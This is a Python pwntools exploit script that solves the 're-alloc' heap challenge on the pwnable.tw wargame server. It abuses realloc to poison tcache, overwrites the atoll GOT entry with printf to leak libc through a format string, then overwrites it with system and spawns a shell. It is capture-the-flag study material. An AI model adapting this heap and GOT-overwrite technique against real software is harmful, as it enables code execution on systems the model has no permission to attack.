#!/usr/bin/env python3

from pwn import *

debug = 0

binary = "./re-alloc_patched"
elf = ELF(binary)
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

context.binary = elf

def conn():
    if debug:
        r = process(binary)
    else:
        r = remote("chall.pwnable.tw", 10106)
    return r

r = conn()

def alloc(idx, data, size, dbg=False):
    r.sendlineafter(b"Your choice:", b"1")
    r.sendafter(b"Index:", str(idx))
    r.sendafter(b"Size:", str(size).encode())
    if dbg:
        print(r.recv(2))
    r.sendafter(b"Data:", data)

def realloc(idx, data, size):
    r.sendlineafter(b"Your choice:", b"2")
    r.sendafter(b":", str(idx).encode())
    r.sendafter(b":", str(size).encode())
    if size != 0:
        r.sendafter(b":", data)

def free(idx):
    r.sendlineafter(b"Your choice:", b"3")
    r.sendafter(b":", str(idx).encode())

def leak(evil):
    r.sendlineafter(b"Your choice:", b"3")
    r.sendafter(b":", evil)

heap_list = 0x4040B0
atoll_got = elf.got["atoll"]
printf_plt = elf.symbols["printf"]

log.info(f"[heap_list addr]: {hex(heap_list)}")
log.info(f"[atoll() GOT addr]: {hex(atoll_got)}")
log.info(f"[printf() PLT addr]: {hex(printf_plt)}")

# first corruption for libc leak
alloc(1, b'AAAA', 0x30)
realloc(1, b"", 0)
realloc(1, p64(atoll_got), 0x30)

alloc(0, b'AAAAA', 0x30)

realloc(1,b'AAA',0x60)
free(1)

realloc(0,b'AAA',0x70)
free(0)

# second corruption for system('/bin/sh')
alloc(0, b'BBBB', 0x18)
realloc(0, b"", 0)
realloc(0, p64(atoll_got), 0x18)

alloc(1, b'BBBBB', 0x18)

realloc(1,b'BBB',0x40)
free(1)

realloc(0,b'BBB',0x50)
free(0)

# leak libc
alloc(0, p64(printf_plt), 0x30)
leak(b"%21$p")

libc_offset = 0x26b6b
libc_leak = int(r.recv(14).decode(), 16)
libc.address = libc_leak - libc_offset
log.info(f"[LIBC LEAK]: {hex(libc_leak)}")
log.info(f"[LIBC ADDR]: {hex(libc.address)}")
log.info(f"[system() ADDR]: {hex(libc.symbols['system'])}")

'''
SUPER FUCKING IMPORTANT ABOUT WHY WE PASS A AS INDX AND SIZE
BECAUSE WE OVERWROTE ATOLL() WITH PRINTF()
THE BINARY'S READ_LONG() FUNC WILL NOW RETURN
THE RETURN VALUE OF PRINTF! WHICH IS HOW MANY CHARS ARE PRINTED!
'''
# overwrite GOT atoll() with system() address
alloc("A", p64(libc.symbols["system"]), "A"*0x10)
# execute system('/bin/sh')
r.sendlineafter(b"Your choice:", b"3")
r.sendafter(b":", b"/bin/sh\x00")

r.interactive()
